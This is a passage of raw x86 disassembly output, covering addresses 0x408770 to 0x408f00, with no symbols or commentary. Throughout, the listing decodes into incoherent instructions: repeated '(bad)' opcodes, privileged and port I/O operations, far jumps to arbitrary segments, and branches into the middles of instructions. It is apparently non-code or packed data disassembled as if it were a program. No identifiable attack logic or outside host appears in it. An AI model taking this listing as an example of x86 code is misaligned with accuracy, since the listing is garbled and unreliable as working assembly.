  408770:	lds    ebp,FWORD PTR [ebp+0x6cc54d10]
  408776:	pop    eax
  408777:	ficomp WORD PTR [ebx]
  408779:	rcr    BYTE PTR [edi+ebp*4-0x7777ad0],cl
  408780:	xor    BYTE PTR [esp+ebp*4],0x9
  408784:	addr16 dec esi
  408786:	sbb    ebx,DWORD PTR [edi+0x6f]
  408789:	xchg   ebx,eax
  40878a:	xchg   esi,eax
  40878b:	mov    edx,0xad38d9f4
  408790:	inc    ebp
  408791:	lods   eax,DWORD PTR ds:[esi]
  408792:	pop    ebp
  408793:	xlat   BYTE PTR ds:[ebx]
  408794:	popf   
  408795:	xchg   esp,eax
  408796:	jmp    0x4087f0
  408798:	push   ecx
  408799:	pop    esi
  40879a:	push   cs
  40879b:	dec    edi
  40879c:	or     al,0xb1
  40879e:	xchg   DWORD PTR [ebx+0x24],esp
  4087a1:	xchg   esi,eax
  4087a2:	mov    BYTE PTR [ebp+esi*1-0xd],bh
  4087a6:	outs   dx,BYTE PTR ds:[esi]
  4087a7:	(bad)  
  4087a8:	ror    ah,0x5f
  4087ab:	pop    eax
  4087ac:	jne    0x4087d5
  4087ae:	adc    dh,BYTE PTR [edx+ebp*4]
  4087b1:	xor    eax,0x5e698dc7
  4087b6:	jecxz  0x408743
  4087b8:	mov    edi,0x4b4f9391
  4087bd:	jecxz  0x40877e
  4087bf:	xor    cl,ch
  4087c1:	xchg   ebp,eax
  4087c2:	sub    DWORD PTR [ebp-0x18],ebp
  4087c5:	cmp    BYTE PTR [edi-0x6f49a7c0],al
  4087cb:	sbb    BYTE PTR [edi-0x5e0035c8],bl
  4087d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d2:	js     0x408764
  4087d4:	bound  ebx,QWORD PTR [eax-0x5b]
  4087d7:	adc    al,0xcb
  4087d9:	jmp    0xd048:0x518fe885
  4087e0:	dec    eax
  4087e1:	cmp    BYTE PTR [esi+0x41910dcc],dh
  4087e7:	js     0x40876d
  4087e9:	je     0x4087c5
  4087eb:	sbb    al,0x0
  4087ed:	xchg   ebp,eax
  4087ee:	hlt    
  4087ef:	lods   al,BYTE PTR ds:[esi]
  4087f0:	retf   
  4087f1:	repnz repz mov esp,0x66019d78
  4087f8:	jp     0x408819
  4087fa:	push   cs
  4087fb:	mov    ecx,0x856332a1
  408800:	push   ebp
  408801:	fist   DWORD PTR [ebx]
  408803:	pop    ecx
  408804:	pop    esp
  408805:	and    dh,BYTE PTR [edi-0x12]
  408808:	add    al,BYTE PTR [ebp-0x73]
  40880b:	mov    ds:0x9663f275,eax
  408810:	in     al,dx
  408811:	cmp    al,0x6b
  408813:	mov    cl,0xa
  408815:	sti    
  408816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408817:	jecxz  0x408808
  408819:	sub    BYTE PTR [eax-0x417250c1],bh
  40881f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408820:	mov    edx,0xecd51b32
  408825:	cmp    DWORD PTR [ebp-0x7a],esi
  408828:	dec    edi
  408829:	add    bh,BYTE PTR [ebp+0x53]
  40882c:	cli    
  40882d:	rol    BYTE PTR [ecx+0x6e],1
  408830:	dec    ebp
  408831:	adc    ch,BYTE PTR [edi-0x73e45f2a]
  408837:	pushf  
  408838:	std    
  408839:	push   esp
  40883a:	pop    ebx
  40883b:	shl    dl,cl
  40883d:	jnp    0x408842
  40883f:	mov    bh,0x29
  408841:	(bad)  
  408842:	jge    0x40883d
  408844:	sbb    BYTE PTR [ebp-0x1356e952],bh
  40884a:	push   edi
  40884b:	call   FWORD PTR [edi]
  40884d:	ins    BYTE PTR es:[edi],dx
  40884e:	shl    cl,cl
  408850:	ja     0x40882a
  408852:	(bad)  
  408853:	arpl   WORD PTR ds:0x1c1bb42e,di
  408859:	pop    eax
  40885a:	xor    al,0x5d
  40885c:	inc    ebp
  40885d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40885e:	pop    esp
  40885f:	shr    DWORD PTR [ecx],0x69
  408862:	xor    esp,DWORD PTR [esi-0x7e]
  408865:	jmp    DWORD PTR [edi]
  408867:	enter  0xce8d,0xde
  40886b:	ret    0x4db8
  40886e:	arpl   WORD PTR ds:0x1edd0a78,dx
  408874:	mov    al,ds:0x661fc462
  408879:	sbb    ah,ch
  40887b:	int    0xe
  40887d:	rol    BYTE PTR [ecx],0x37
  408880:	clc    
  408881:	vshufpd ymm3,ymm1,ymm7,0xb1
  408886:	pusha  
  408887:	loope  0x40881d
  408889:	jno    0x40889c
  40888b:	test   eax,0x333bffc2
  408890:	push   es
  408891:	pop    edx
  408892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408893:	in     al,0xe6
  408895:	test   DWORD PTR [ebx],esi
  408897:	cwde   
  408898:	shl    dh,1
  40889a:	ds pop ebx
  40889c:	push   edx
  40889d:	lea    eax,[eax-0x1986bf8d]
  4088a3:	sar    DWORD PTR [ebp+ebp*8-0x80],cl
  4088a7:	ja     0x4088f0
  4088a9:	lahf   
  4088aa:	dec    ebp
  4088ab:	jo     0x4088b6
  4088ad:	pop    ebx
  4088ae:	les    esp,FWORD PTR [esi-0x4]
  4088b1:	pop    ebp
  4088b2:	(bad)  
  4088b3:	xchg   edx,eax
  4088b4:	inc    esp
  4088b5:	adc    DWORD PTR [edx],edi
  4088b7:	popf   
  4088b8:	and    ebx,DWORD PTR [eax+edi*8+0x4d]
  4088bc:	mov    DWORD PTR [ecx+0x2625ef78],esp
  4088c2:	mov    eax,0xeddbf360
  4088c7:	mov    ch,0xe7
  4088c9:	add    BYTE PTR [ebp+0x21aec3ae],bh
  4088cf:	fldenv [eax+0x64e046c0]
  4088d5:	enter  0x76c0,0x7a
  4088d9:	add    al,0x99
  4088db:	sbb    ah,BYTE PTR ds:0x13a75e9a
  4088e1:	and    al,0x5e
  4088e3:	inc    esp
  4088e4:	xor    BYTE PTR [ebx],dh
  4088e6:	jno    0x4088ba
  4088e8:	neg    BYTE PTR [ebp+0x0]
  4088eb:	dec    ebp
  4088ec:	xchg   esp,eax
  4088ed:	daa    
  4088ee:	mov    BYTE PTR [ecx+0x49],bh
  4088f1:	jo     0x4088fe
  4088f3:	push   esp
  4088f4:	cli    
  4088f5:	lahf   
  4088f6:	das    
  4088f7:	es imul edx,DWORD PTR fs:[eax-0x17],0x17
  4088fd:	sbb    esp,ebx
  4088ff:	cmp    bh,BYTE PTR [esi]
  408901:	scas   al,BYTE PTR es:[edi]
  408902:	mov    ebp,0xab129e50
  408907:	pop    ds
  408908:	outs   dx,DWORD PTR ds:[esi]
  408909:	in     eax,0xe1
  40890b:	dec    ecx
  40890c:	xor    bh,al
  40890e:	pushf  
  40890f:	pop    eax
  408910:	pop    esi
  408911:	or     BYTE PTR [eax],0xa2
  408914:	js     0x408951
  408916:	or     BYTE PTR [edx+0x3b4c2a99],dl
  40891c:	in     eax,0xb5
  40891e:	dec    edi
  40891f:	add    ah,BYTE PTR [edi-0x2c]
  408922:	pop    esi
  408923:	xchg   ecx,eax
  408924:	or     al,0x29
  408926:	lds    eax,FWORD PTR [ecx+ebp*1]
  408929:	mov    bl,0x22
  40892b:	into   
  40892c:	cmp    ecx,edx
  40892e:	inc    esp
  40892f:	imul   ebx
  408931:	pop    edx
  408932:	adc    ebx,esp
  408934:	dec    eax
  408935:	dec    eax
  408936:	stos   DWORD PTR es:[edi],eax
  408937:	xor    BYTE PTR [ebp+eiz*8-0x5b],0xfd
  40893c:	aam    0x6e
  40893e:	aas    
  40893f:	xchg   edi,eax
  408940:	fcmovu st,st(0)
  408942:	gs stos BYTE PTR es:[edi],al
  408944:	inc    ecx
  408945:	jmp    DWORD PTR [eax]
  408947:	push   0xd0d2b45f
  40894c:	xchg   ebp,eax
  40894d:	imul   edi,esi,0x11b19e5f
  408953:	sbb    edi,DWORD PTR [ebx-0x37]
  408956:	fnsave [ebx]
  408958:	out    0x9e,al
  40895a:	loope  0x40896c
  40895c:	bound  edx,QWORD PTR [ebx]
  40895e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40895f:	mov    al,0xb4
  408961:	nop
  408962:	sub    BYTE PTR [edx+0xa242739],bl
  408968:	cmp    dl,ah
  40896a:	aam    0x48
  40896c:	cdq    
  40896d:	push   es
  40896e:	mov    dh,0xf8
  408970:	sbb    DWORD PTR [edi+0x52],0xa2fa6b20
  408977:	sbb    ebp,DWORD PTR [esi+0x3f]
  40897a:	xlat   BYTE PTR ds:[ebx]
  40897b:	aad    0xe
  40897d:	stos   BYTE PTR es:[edi],al
  40897e:	arpl   WORD PTR [ebp-0x15b1adbb],sp
  408984:	cld    
  408985:	mov    dh,dl
  408987:	sbb    eax,0x3271c313
  40898c:	or     bh,BYTE PTR [esi+0x1a49a992]
  408992:	cmp    eax,DWORD PTR [ebx+esi*8]
  408995:	pop    eax
  408996:	xlat   BYTE PTR ss:[ebx]
  408998:	push   cs
  408999:	retf   0xb72e
  40899c:	inc    edi
  40899d:	jmp    0x4089fe
  40899f:	out    dx,al
  4089a0:	sbb    eax,0x1ae1cccc
  4089a5:	(bad)  
  4089a7:	xchg   edx,eax
  4089a8:	retf   0x7c20
  4089ab:	cmp    al,0x7d
  4089ad:	stc    
  4089ae:	xor    BYTE PTR [ecx+edx*8-0x35],ch
  4089b2:	fdivr  st(6),st
  4089b4:	push   0xffffffe5
  4089b6:	outs   dx,DWORD PTR ds:[esi]
  4089b7:	mov    al,0x2a
  4089b9:	ins    BYTE PTR es:[edi],dx
  4089ba:	mov    edi,0x3e605364
  4089bf:	loopne 0x408987
  4089c1:	or     edx,DWORD PTR [ebx]
  4089c3:	(bad)  
  4089c5:	fstp   DWORD PTR [edi]
  4089c7:	push   ss
  4089c8:	xor    al,al
  4089ca:	call   0xe20f:0x9e02289b
  4089d1:	push   ecx
  4089d2:	loopne 0x408975
  4089d4:	pop    ss
  4089d5:	(bad)  
  4089d6:	adc    ecx,ebx
  4089d8:	hlt    
  4089d9:	dec    edx
  4089da:	mov    al,0xc0
  4089dc:	jae    0x408a0a
  4089de:	add    ch,ch
  4089e0:	and    bp,di
  4089e3:	pop    ebx
  4089e4:	mov    eax,DWORD PTR [esi]
  4089e6:	xchg   ebp,eax
  4089e7:	or     dh,BYTE PTR [ecx]
  4089e9:	pop    esp
  4089ea:	out    0x44,eax
  4089ec:	mov    BYTE PTR [eax+0x4678b8a7],dl
  4089f2:	push   edx
  4089f3:	and    BYTE PTR [ecx],0xee
  4089f6:	mov    dh,0xae
  4089f8:	shl    BYTE PTR cs:[edi+0x6c],1
  4089fc:	sbb    esp,ebp
  4089fe:	scas   al,BYTE PTR es:[edi]
  4089ff:	addr16 mov esi,edi
  408a02:	pop    eax
  408a03:	lods   al,BYTE PTR ds:[esi]
  408a04:	fsubr  QWORD PTR [esi-0x31d6ce6f]
  408a0a:	or     eax,DWORD PTR ds:0xeee842a7
  408a10:	add    ecx,DWORD PTR gs:[ecx-0x7dd7693]
  408a17:	call   0x4b7b458d
  408a1c:	cwde   
  408a1d:	push   ss
  408a1e:	push   edi
  408a1f:	add    al,BYTE PTR [ebp+0x70]
  408a22:	int3   
  408a23:	jno    0x4089fc
  408a25:	ins    DWORD PTR es:[edi],dx
  408a26:	or     ecx,DWORD PTR [ebx]
  408a28:	das    
  408a29:	cmp    edi,esp
  408a2b:	test   DWORD PTR ds:0xa851c99,0x3e76423a
  408a35:	js     0x4089be
  408a37:	pop    edx
  408a38:	sub    cl,BYTE PTR [edi+eax*4]
  408a3b:	xor    dh,0x2d
  408a3e:	out    0xca,eax
  408a40:	mov    ah,0x39
  408a42:	shr    BYTE PTR [ecx],1
  408a44:	jae    0x4089da
  408a46:	ret    
  408a47:	xor    al,0x37
  408a49:	inc    edx
  408a4a:	cmp    esp,DWORD PTR [esi+0x35]
  408a4d:	sbb    ecx,esi
  408a4f:	inc    ebx
  408a50:	leave  
  408a51:	and    DWORD PTR [ebx],edx
  408a53:	mov    cl,0xa2
  408a55:	and    BYTE PTR [edi-0x4c5923e8],dh
  408a5b:	aam    0xcf
  408a5d:	shl    DWORD PTR ss:[edi],cl
  408a60:	daa    
  408a61:	mov    db0,eax
  408a64:	icebp  
  408a65:	sub    BYTE PTR [ecx],dh
  408a67:	sahf   
  408a68:	sub    dh,BYTE PTR [ecx]
  408a6a:	xor    BYTE PTR [eax-0x5c],ch
  408a6d:	stc    
  408a6e:	add    DWORD PTR [ebp+0x6ace3c42],0x3a6bc0d8
  408a78:	test   BYTE PTR [eax+0x3e2c37b2],dh
  408a7e:	pop    ss
  408a7f:	pop    ss
  408a80:	and    al,0x46
  408a82:	in     eax,dx
  408a83:	shr    DWORD PTR [esi-0x78],1
  408a86:	into   
  408a87:	push   ss
  408a88:	test   DWORD PTR [ecx+0x19],eax
  408a8b:	xchg   edi,eax
  408a8c:	(bad)  
  408a8d:	xor    ecx,DWORD PTR [ecx-0x5c]
  408a90:	dec    ecx
  408a91:	push   0x17e706f4
  408a96:	sub    ebp,0x8a3dcc4c
  408a9c:	std    
  408a9d:	lds    edx,FWORD PTR [ebx]
  408a9f:	in     eax,dx
  408aa0:	leave  
  408aa1:	je     0x408aba
  408aa3:	stos   DWORD PTR es:[edi],eax
  408aa4:	inc    ecx
  408aa5:	mov    DWORD PTR [edx],0x7e135fbe
  408aab:	and    cl,BYTE PTR [edi]
  408aad:	mov    edi,0xb2593fd7
  408ab2:	xor    bh,bl
  408ab4:	sahf   
  408ab5:	or     DWORD PTR [edx-0x4468f8be],eax
  408abb:	dec    DWORD PTR [edi]
  408abd:	or     al,0xd9
  408abf:	cmp    eax,0xb8c4c307
  408ac4:	sub    BYTE PTR [ecx],0x5f
  408ac7:	fisttp QWORD PTR [ebx+0x780c0898]
  408acd:	xchg   ecx,eax
  408ace:	sbb    al,0x3b
  408ad0:	mov    DWORD PTR [ecx],edi
  408ad2:	mov    al,ds:0x4ecdfb1f
  408ad7:	cdq    
  408ad8:	or     eax,0x829f4a7c
  408add:	test   bh,al
  408adf:	push   edi
  408ae0:	cli    
  408ae1:	xlat   BYTE PTR ds:[ebx]
  408ae2:	jecxz  0x408a69
  408ae4:	mov    esi,0x4274a6ea
  408ae9:	in     eax,0x7e
  408aeb:	ins    DWORD PTR es:[edi],dx
  408aec:	fistp  QWORD PTR [esi+0x9abe562]
  408af2:	pop    edi
  408af3:	into   
  408af4:	fstp   DWORD PTR [esi+0x7f6aa31]
  408afa:	adc    eax,0xd3b5a72f
  408aff:	fcom   QWORD PTR [ebx-0x1f46cda1]
  408b05:	pandn  mm4,QWORD PTR ds:0x91af1a67
  408b0c:	sti    
  408b0d:	jnp    0x408a99
  408b0f:	sbb    ch,bl
  408b11:	jge    0x408ae5
  408b13:	cmp    edx,eax
  408b15:	fisubr WORD PTR [ebx-0x6eb2a8c8]
  408b1b:	mov    cl,0x8
  408b1d:	in     al,dx
  408b1e:	out    dx,al
  408b1f:	bound  ecx,QWORD PTR [eax+0x4476c166]
  408b25:	xchg   di,ax
  408b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b28:	rcr    DWORD PTR [edx],0x6f
  408b2b:	fdivr  QWORD PTR [ebx+0x176765b]
  408b31:	es push 0x7d
  408b34:	out    dx,al
  408b35:	xchg   BYTE PTR [edx],ah
  408b37:	xchg   esi,ebx
  408b39:	idiv   DWORD PTR [ebp+0x9]
  408b3c:	bound  eax,QWORD PTR [edi]
  408b3e:	fsub   st,st(1)
  408b40:	cwde   
  408b41:	test   edx,ebx
  408b43:	add    esi,DWORD PTR [esi-0x4c5b9b16]
  408b49:	test   al,0x1d
  408b4b:	mov    dl,BYTE PTR [esi-0x22]
  408b4e:	(bad)  
  408b4f:	loop   0x408b9a
  408b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b52:	(bad)  
  408b54:	pushf  
  408b55:	pop    ds
  408b56:	fucomi st,st(1)
  408b58:	out    dx,eax
  408b59:	das    
  408b5a:	pop    eax
  408b5b:	dec    esi
  408b5c:	and    BYTE PTR [eax],dl
  408b5e:	mov    ecx,0xf31b300a
  408b63:	iret   
  408b64:	pop    es
  408b65:	mov    ch,0x4e
  408b67:	cmp    al,0x61
  408b69:	sbb    edx,DWORD PTR [esi+0x57ed9cdd]
  408b6f:	jno    0x408b42
  408b71:	loop   0x408b83
  408b73:	xor    bh,BYTE PTR ds:0x135d4015
  408b79:	or     al,0x77
  408b7b:	out    0x7,eax
  408b7d:	jnp    0x408ba9
  408b7f:	test   al,0xd8
  408b81:	mov    esi,0x30ba5684
  408b86:	ret    
  408b87:	sar    DWORD PTR [edi+0x4980326d],cl
  408b8d:	retf   
  408b8e:	xor    bl,BYTE PTR [ebx+0x12]
  408b91:	sbb    dl,BYTE PTR ds:0x5bc16bfd
  408b97:	jmp    0xae71:0xbe2cff55
  408b9e:	fs push eax
  408ba0:	fcom   DWORD PTR ss:[edi+0x3390f69c]
  408ba7:	jo     0x408bc2
  408ba9:	mov    ebx,0xb9db7878
  408bae:	inc    ebx
  408baf:	add    eax,0xfa1b9834
  408bb4:	rcr    DWORD PTR [edx-0x3e],0xbd
  408bb8:	dec    eax
  408bb9:	shl    DWORD PTR [eax-0x3d],1
  408bbc:	mov    al,ds:0x3adb9ca7
  408bc1:	(bad)  
  408bc2:	sub    edi,DWORD PTR [edx-0xc8a0d1c]
  408bc8:	aaa    
  408bc9:	and    DWORD PTR [esi+0x5c8b7761],eax
  408bcf:	and    eax,0x755c8b0c
  408bd4:	ret    
  408bd5:	cwde   
  408bd6:	xor    DWORD PTR [esi-0x2c65896c],esi
  408bdc:	push   eax
  408bdd:	pop    esp
  408bde:	mov    ds:0xc0891358,eax
  408be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be4:	dec    edx
  408be5:	xor    ecx,0xffffffbb
  408be8:	cmp    BYTE PTR [ebp-0x5164c539],dh
  408bee:	std    
  408bef:	mov    ebx,ebp
  408bf1:	add    al,0x1c
  408bf3:	out    0xb4,al
  408bf5:	sub    BYTE PTR [edx+eax*1+0x778eb263],ch
  408bfc:	ja     0x408be9
  408bfe:	popfw  
  408c00:	rcr    BYTE PTR [eax],1
  408c02:	addr16 cmc 
  408c04:	add    DWORD PTR [ebx-0x3c6530d9],edx
  408c0a:	jg     0x408bf7
  408c0c:	call   0x3ad6:0x9360e4db
  408c13:	xchg   ebx,eax
  408c14:	ret    0xb9a4
  408c17:	ret    0x49fc
  408c1a:	push   ecx
  408c1b:	xchg   ebx,eax
  408c1c:	add    dh,dl
  408c1e:	mov    ebx,0x28d66f13
  408c23:	push   0xffffff8a
  408c25:	xlat   BYTE PTR ds:[ebx]
  408c26:	mov    ebp,0xf86177b6
  408c2b:	ret    
  408c2c:	(bad)  
  408c2d:	inc    eax
  408c2e:	mul    BYTE PTR [edi]
  408c30:	dec    esi
  408c31:	dec    edi
  408c32:	jbe    0x408c5a
  408c34:	fcmovnbe st,st(6)
  408c36:	or     DWORD PTR [edi-0x7deebab7],esp
  408c3c:	daa    
  408c3d:	mov    ebp,0x89cac525
  408c42:	mov    ah,0xc8
  408c44:	in     eax,0x3b
  408c46:	mov    dl,0xbd
  408c48:	les    bx,DWORD PTR ds:0x4b61636a
  408c4f:	iret   
  408c50:	mov    eax,ds:0x3ee333ab
  408c55:	add    BYTE PTR [ebx-0x43],ah
  408c58:	mov    cl,0x4b
  408c5a:	pop    ds
  408c5b:	arpl   WORD PTR [eax-0x30b7713a],cx
  408c61:	push   cs
  408c62:	ins    BYTE PTR es:[edi],dx
  408c63:	push   ebx
  408c64:	mov    ecx,0x2f2d8315
  408c69:	retf   0x817b
  408c6c:	lods   eax,DWORD PTR ds:[esi]
  408c6d:	in     eax,0x5f
  408c6f:	(bad)  
  408c70:	dec    edi
  408c71:	les    ecx,FWORD PTR [edi-0x44529b38]
  408c77:	sub    al,0x1c
  408c79:	jbe    0x408c6f
  408c7b:	rol    DWORD PTR [ecx+0x184d2f42],1
  408c81:	in     al,dx
  408c82:	push   es
  408c83:	xchg   bl,bl
  408c85:	xchg   ebx,eax
  408c86:	lock ss pop esi
  408c89:	inc    eax
  408c8a:	dec    edi
  408c8b:	ins    BYTE PTR es:[edi],dx
  408c8c:	repnz mov ebx,0x21764883
  408c92:	sub    eax,0x530f90cb
  408c97:	loope  0x408ca9
  408c99:	sub    DWORD PTR [edi],ebp
  408c9b:	xlat   BYTE PTR ds:[ebx]
  408c9c:	xchg   ebp,eax
  408c9d:	iret   
  408c9e:	nop
  408c9f:	in     eax,0xeb
  408ca1:	sub    dl,BYTE PTR [ebp-0x7b]
  408ca4:	jmp    0x408c38
  408ca6:	stos   DWORD PTR es:[edi],eax
  408ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca8:	(bad)
  408cac:	inc    ebp
  408cad:	jmp    0x408cfb
  408caf:	jecxz  0x408cde
  408cb1:	xchg   BYTE PTR [eax-0x73],al
  408cb4:	xchg   esp,eax
  408cb5:	push   edi
  408cb6:	in     al,dx
  408cb7:	or     eax,0xae749f7f
  408cbc:	sub    eax,0x5ee14dbd
  408cc1:	add    al,0x86
  408cc3:	pop    esi
  408cc4:	mov    eax,ds:0x7ee47eda
  408cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cca:	(bad)  
  408ccb:	mov    edi,0xb23f4eda
  408cd0:	popf   
  408cd1:	shr    BYTE PTR [edx+0x4f1ceba2],1
  408cd7:	cmc    
  408cd8:	dec    ecx
  408cd9:	sub    eax,ecx
  408cdb:	fidivr WORD PTR [esi]
  408cdd:	mov    edi,edi
  408cdf:	pop    esi
  408ce0:	sub    eax,0x2a71f030
  408ce5:	add    eax,esp
  408ce7:	les    ecx,FWORD PTR [ebp+0x5d]
  408cea:	mov    ebp,0x8a325c17
  408cef:	dec    esp
  408cf0:	adc    eax,0x74726387
  408cf5:	idiv   BYTE PTR [ecx]
  408cf7:	add    eax,0x7027398c
  408cfc:	add    edi,DWORD PTR [edx]
  408cfe:	lea    ecx,[ecx-0x72]
  408d01:	(bad)  
  408d03:	ds loop 0x408d74
  408d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d07:	xchg   esi,eax
  408d08:	mov    cl,bh
  408d0a:	fwait
  408d0b:	xor    eax,0x219b790
  408d10:	retf   
  408d11:	and    dh,BYTE PTR [edi]
  408d13:	sti    
  408d14:	xor    ecx,0x39
  408d17:	xchg   ecx,eax
  408d18:	mov    ch,0x97
  408d1a:	inc    eax
  408d1b:	dec    edi
  408d1c:	(bad)  
  408d1d:	aam    0x6f
  408d1f:	fs push edx
  408d21:	mov    dh,0xaf
  408d23:	scas   al,BYTE PTR es:[edi]
  408d24:	pop    es
  408d25:	pop    DWORD PTR [ebx]
  408d27:	dec    esi
  408d28:	jnp    0x408cff
  408d2a:	cdq    
  408d2b:	iret   
  408d2c:	outs   dx,DWORD PTR ds:[esi]
  408d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2e:	call   0xa92fe61e
  408d33:	sub    al,0x1f
  408d35:	and    eax,0xa54485df
  408d3a:	xor    al,0x4
  408d3c:	mov    eax,ds:0x8cfd256c
  408d41:	jnp    0x408dbb
  408d43:	test   dl,al
  408d45:	sub    eax,0x2f1adfc6
  408d4a:	mov    ebx,DWORD PTR [edi-0x22]
  408d4d:	dec    esp
  408d4e:	outs   dx,DWORD PTR ds:[esi]
  408d4f:	push   edx
  408d50:	cwde   
  408d51:	jbe    0x408d42
  408d53:	and    eax,0x28e62715
  408d58:	mov    dh,0x52
  408d5a:	push   ds
  408d5b:	nop
  408d5c:	loop   0x408d64
  408d5e:	test   BYTE PTR [eax-0x55],al
  408d61:	sbb    cl,al
  408d63:	dec    esi
  408d64:	sub    bl,dh
  408d66:	loop   0x408d4b
  408d68:	mov    esi,0x4ee228c4
  408d6d:	mov    ebx,DWORD PTR [ecx]
  408d6f:	fcomip st,st(3)
  408d71:	imul   ah
  408d73:	push   ecx
  408d74:	jp     0x408d4c
  408d76:	xchg   DWORD PTR [edx-0x59998c9a],esp
  408d7c:	adc    DWORD PTR [esi-0x35],edx
  408d7f:	dec    edx
  408d80:	and    al,BYTE PTR [ecx+0x44]
  408d83:	mov    dl,0x55
  408d85:	loope  0x408d9a
  408d87:	lahf   
  408d88:	xlat   BYTE PTR ds:[ebx]
  408d89:	(bad)  
  408d8a:	sti    
  408d8b:	xchg   ebx,eax
  408d8c:	cmp    bh,cl
  408d8e:	mov    edi,0xd4819d5a
  408d93:	jo     0x408d57
  408d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d96:	mov    ebp,esp
  408d98:	jge    0x408d85
  408d9a:	retf   
  408d9b:	fisub  WORD PTR [edx-0xf579a75]
  408da1:	retf   0x8ff4
  408da4:	push   edx
  408da5:	jmp    0xbc06:0xcaed92b6
  408dac:	retf   
  408dad:	lahf   
  408dae:	and    ebx,DWORD PTR [ebp-0x62594a6e]
  408db4:	xor    eax,0x214c0478
  408db9:	mov    ds:0xfd232cec,eax
  408dbe:	cli    
  408dbf:	pushf  
  408dc0:	or     al,0x17
  408dc2:	cmp    ch,BYTE PTR [ebp+0x44]
  408dc5:	cmp    ebx,ebp
  408dc7:	es clts 
  408dca:	call   0xb57d:0xb7d7ad3c
  408dd1:	mov    al,ds:0x44542971
  408dd6:	cli    
  408dd7:	ror    DWORD PTR [edi],1
  408dd9:	dec    ebx
  408dda:	in     eax,dx
  408ddb:	push   ebx
  408ddc:	lahf   
  408ddd:	or     al,BYTE PTR [ebx+0x46]
  408de0:	fsubrp st(5),st
  408de2:	jne    0x408e1e
  408de4:	cdq    
  408de5:	add    ebp,esp
  408de7:	ret    0xe27
  408dea:	add    BYTE PTR [ebx+0x41b88464],ch
  408df0:	jl     0x408da6
  408df2:	xchg   esp,eax
  408df3:	lds    edx,FWORD PTR [esi-0x34]
  408df6:	shl    DWORD PTR [esi-0x26],1
  408df9:	dec    esp
  408dfa:	movaps xmm2,xmm6
  408dfd:	ffree  st(2)
  408dff:	mov    DWORD PTR [eax+ebp*8+0x5e48cdff],ebx
  408e06:	imul   BYTE PTR [ebp+ebp*2+0x6423178]
  408e0d:	enter  0xd723,0x87
  408e11:	inc    esp
  408e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e13:	outs   dx,BYTE PTR ds:[esi]
  408e14:	(bad)  
  408e16:	push   esi
  408e17:	sahf   
  408e18:	xchg   ebx,eax
  408e19:	ss jmp 0x62cd:0xfc3efe0d
  408e21:	and    DWORD PTR [esp+ebp*2-0x1c],ebx
  408e25:	ret    
  408e26:	mov    ch,ch
  408e28:	fnstsw WORD PTR [edi+0xe15759d]
  408e2e:	or     ebx,DWORD PTR [ecx+0x54]
  408e31:	sbb    edi,edx
  408e33:	retf   
  408e34:	or     DWORD PTR [esp+ebx*2-0x59136cdd],0xffffffa1
  408e3c:	(bad)  
  408e3d:	jecxz  0x408de7
  408e3f:	and    ch,bl
  408e41:	je     0x408dc4
  408e43:	arpl   dx,di
  408e45:	cmp    al,0x77
  408e47:	or     BYTE PTR [ebp+0x750b56db],ah
  408e4d:	loope  0x408e97
  408e4f:	into   
  408e50:	fcomp  QWORD PTR [edx+eiz*1-0x75]
  408e54:	mov    dl,0xe4
  408e56:	test   al,0x4e
  408e58:	and    al,0x62
  408e5a:	push   ecx
  408e5b:	or     esp,DWORD PTR [esi+ebx*8-0x5624a270]
  408e62:	dec    eax
  408e63:	(bad)  
  408e65:	xchg   esp,eax
  408e66:	jbe    0x408e98
  408e68:	sub    DWORD PTR [ebx+ebx*2-0x4ef158b2],0x9
  408e70:	(bad)  [esi]
  408e72:	addr16 sbb edx,esp
  408e75:	inc    edx
  408e76:	xor    eax,eax
  408e78:	xor    BYTE PTR [ecx+edi*1],ah
  408e7b:	pushf  
  408e7c:	jmp    0xafd5:0xc0582e06
  408e83:	int    0xe3
  408e85:	jno    0x408ef4
  408e87:	xchg   esp,eax
  408e88:	dec    esp
  408e89:	inc    edi
  408e8a:	pop    ecx
  408e8b:	mov    ch,0xf
  408e8d:	jbe    0x408e32
  408e8f:	and    eax,0x37fec286
  408e94:	jno    0x408eac
  408e96:	jmp    0x5d6f04c3
  408e9b:	adc    ebp,DWORD PTR [edx+0x69]
  408e9e:	adc    al,BYTE PTR [edi+0x35]
  408ea1:	(bad)  
  408ea3:	lds    esp,FWORD PTR [ebp+0x36475daa]
  408ea9:	push   eax
  408eaa:	mov    ds,WORD PTR [edx+0x1b]
  408ead:	pushf  
  408eae:	or     DWORD PTR [eax+0x44],edx
  408eb1:	frstor [ebx+0x17]
  408eb4:	pop    esp
  408eb5:	iret   
  408eb6:	mov    al,0x84
  408eb8:	push   ebx
  408eb9:	or     BYTE PTR [ecx-0x73],ah
  408ebc:	hlt    
  408ebd:	imul   esi,DWORD PTR [edx+0x3f],0xbe11b30
  408ec4:	or     DWORD PTR [esi+ebp*1+0x79da3787],edx
  408ecb:	push   0x10c8b8a1
  408ed0:	and    ebx,DWORD PTR [edx]
  408ed2:	mov    fs,esi
  408ed4:	push   ebx
  408ed5:	or     BYTE PTR [eax+0x51b899b6],0xbb
  408edc:	(bad)  
  408edd:	jmp    0xcd55:0x9cca67a1
  408ee4:	pop    ds
  408ee5:	mov    ah,0x29
  408ee7:	mov    ?,WORD PTR [di]
  408eea:	jp     0x408f66
  408eec:	mov    eax,ebx
  408eee:	inc    ecx
  408eef:	push   cs
  408ef0:	or     esp,esi
  408ef2:	sub    dh,BYTE PTR [ecx+0x41bb7cc2]
  408ef8:	dec    edi
  408ef9:	mov    BYTE PTR [esi+0x5f],cl
  408efc:	and    dl,BYTE PTR [edx]
  408efe:	shl    BYTE PTR [eax],cl
  408f00:	inc    ecx
